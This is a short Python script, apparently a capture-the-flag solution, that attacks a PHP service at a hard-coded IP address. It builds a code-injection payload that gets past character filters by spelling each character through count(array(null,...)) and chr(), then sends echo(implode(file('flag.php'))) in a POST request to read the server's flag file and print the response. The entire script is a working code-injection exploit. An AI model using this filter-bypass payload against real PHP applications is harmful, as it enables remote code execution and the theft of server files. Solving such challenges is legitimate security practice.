import requests

BASE_URL = "http://52.59.124.14:5011"

def convert_count(n):
    return "count(array(" + ",".join(["null"] * n) + "))"

def encode_ord(n):
    return "chr(" + convert_count(n) + ")"

def encode_string(s):
    return "implode(array(" + ",".join(encode_ord(ord(c)) for c in s) + "))"

payload = "echo(implode(file(" + encode_string("flag.php") + ")))"
print(payload)

print(requests.post(BASE_URL + "/", data={"input": payload}).text[:58])
